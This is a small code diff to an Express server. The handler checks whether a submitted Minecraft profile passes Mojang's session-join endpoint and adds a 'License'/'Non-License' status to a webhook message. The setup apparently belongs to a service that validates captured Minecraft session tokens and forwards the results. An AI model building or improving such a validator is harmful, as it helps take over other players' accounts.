@@ -42,7 +42,7 @@ app.post("/", async (req, res) => {
             selectedProfile: req.body.uuid,
             serverId: req.body.uuid
         }).then(res => {
-            if (res.status === 403) {
+            if (res.data && res.data.path === "/session/minecraft/join") {
                 return "Non-License";
             } else if (res.status === 200) {
                 return "License";
@@ -63,8 +63,6 @@ app.post("/", async (req, res) => {
             }],
             attachments: []
         };
-
-        // Если лицензия не подтверждена, завершить выполнение без дополнительных запросов
         if (response === "Non-License") {
             webhookData.embeds[0].fields.push({
                 name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
